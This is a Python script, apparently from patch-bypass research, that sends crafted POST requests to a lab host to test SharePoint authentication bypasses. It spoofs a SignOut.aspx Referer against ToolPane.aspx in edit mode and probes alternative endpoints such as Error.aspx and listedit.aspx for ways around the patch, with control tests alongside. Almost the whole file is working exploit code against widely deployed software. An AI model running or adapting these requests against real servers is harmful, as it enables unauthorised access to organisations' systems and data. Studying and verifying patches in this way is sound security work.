# Final Verification: Strict evidence-based testing
# Purpose: Re-test all critical claims with detailed evidence documentation

import requests
import json
from datetime import datetime

base_url = "http://10.10.10.166"

def test_bypass(name, endpoint, headers, expected_status, expected_outcome):
    """Test a bypass hypothesis and document evidence"""
    print(f"\n{'='*70}")
    print(f"TEST: {name}")
    print(f"{'='*70}")
    
    print(f"\n[REQUEST]")
    print(f"POST {endpoint} HTTP/1.1")
    print(f"Host: 10.10.10.166")
    for k, v in headers.items():
        print(f"{k}: {v}")
    print(f"Content-Type: application/x-www-form-urlencoded")
    print(f"\nBody: test=data")
    
    try:
        response = requests.post(
            f"{base_url}{endpoint}",
            headers=headers,
            data="test=data",
            timeout=10,
            allow_redirects=False
        )
        
        print(f"\n[RESPONSE]")
        print(f"HTTP/1.1 {response.status_code} {response.reason}")
        print(f"Content-Type: {response.headers.get('Content-Type', 'N/A')}")
        print(f"Content-Length: {response.headers.get('Content-Length', len(response.content))}")
        if 'Set-Cookie' in response.headers:
            print(f"Set-Cookie: {response.headers['Set-Cookie']}")
        if 'Location' in response.headers:
            print(f"Location: {response.headers['Location']}")
        print(f"\nBody (first 200 chars):")
        print(response.text[:200])
        
        print(f"\n[EVIDENCE ANALYSIS]")
        if response.status_code == expected_status:
            print(f"✅ Status code matches expectation: {expected_status}")
        else:
            print(f"❌ Status code mismatch: expected {expected_status}, got {response.status_code}")
        
        if response.status_code == 200:
            print(f"✅ Authentication bypassed - page content returned")
            print(f"   Evidence: Server returned HTML content ({len(response.content)} bytes)")
            actual_outcome = "BYPASS_SUCCESS"
        elif response.status_code == 401:
            print(f"✅ Authentication required - access denied")
            print(f"   Evidence: 401 Unauthorized response")
            actual_outcome = "BLOCKED"
        elif response.status_code in [302, 303, 307]:
            print(f"⚠️  Redirect response")
            print(f"   Evidence: Redirected to {response.headers.get('Location', 'unknown')}")
            actual_outcome = "REDIRECT"
        else:
            print(f"⚠️  Unexpected status: {response.status_code}")
            actual_outcome = "UNEXPECTED"
        
        print(f"\n[TEST RESULT]")
        if actual_outcome == expected_outcome:
            print(f"✅ CONFIRMED: {expected_outcome}")
            return "CONFIRMED"
        else:
            print(f"❌ REJECTED: Expected {expected_outcome}, got {actual_outcome}")
            return "REJECTED"
            
    except Exception as e:
        print(f"\n[ERROR]")
        print(f"❌ Test failed with exception: {e}")
        print(f"\n[TEST RESULT]")
        print(f"⚠️  INCONCLUSIVE: Could not complete test")
        return "ERROR"

# Test Suite
results = {}

# Test 1: Original exploit against ToolPane.aspx (should be BLOCKED by patch)
results['toolpane_blocked'] = test_bypass(
    name="Original Exploit: ToolPane.aspx with signout referer (SHOULD BE BLOCKED)",
    endpoint="/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
    headers={
        "Referer": "/_layouts/SignOut.aspx",
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3"
    },
    expected_status=401,
    expected_outcome="BLOCKED"
)

# Test 2: Alternative endpoint bypass - Error.aspx (should be BYPASSED)
results['error_bypassed'] = test_bypass(
    name="Bypass Hypothesis: Error.aspx with signout referer (SHOULD BE BYPASSED)",
    endpoint="/_layouts/15/Error.aspx",
    headers={
        "Referer": "/_layouts/SignOut.aspx",
        "User-Agent": "Mozilla/5.0"
    },
    expected_status=200,
    expected_outcome="BYPASS_SUCCESS"
)

# Test 3: Control test - Error.aspx without bypass (should be BLOCKED)
results['error_control'] = test_bypass(
    name="Control Test: Error.aspx WITHOUT signout referer (SHOULD BE BLOCKED)",
    endpoint="/_layouts/15/Error.aspx",
    headers={
        "User-Agent": "Mozilla/5.0"
    },
    expected_status=401,
    expected_outcome="BLOCKED"
)

# Test 4: Alternative endpoint bypass - listedit.aspx
results['listedit_bypassed'] = test_bypass(
    name="Bypass Hypothesis: listedit.aspx with signout referer (SHOULD BE BYPASSED)",
    endpoint="/_layouts/15/listedit.aspx",
    headers={
        "Referer": "/_layouts/SignOut.aspx",
        "User-Agent": "Mozilla/5.0"
    },
    expected_status=200,
    expected_outcome="BYPASS_SUCCESS"
)

# Test 5: Settings.aspx (should be BLOCKED even with signout referer)
results['settings_blocked'] = test_bypass(
    name="Negative Test: Settings.aspx with signout referer (SHOULD BE BLOCKED)",
    endpoint="/_layouts/15/Settings.aspx",
    headers={
        "Referer": "/_layouts/SignOut.aspx",
        "User-Agent": "Mozilla/5.0"
    },
    expected_status=401,
    expected_outcome="BLOCKED"
)

# Summary
print(f"\n\n{'='*70}")
print(f"FINAL VERIFICATION SUMMARY")
print(f"{'='*70}")
print(f"\nTest Results:")
for test_name, result in results.items():
    print(f"  {test_name}: {result}")

confirmed = sum(1 for r in results.values() if r == "CONFIRMED")
total = len(results)
print(f"\nConfirmed: {confirmed}/{total}")
print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
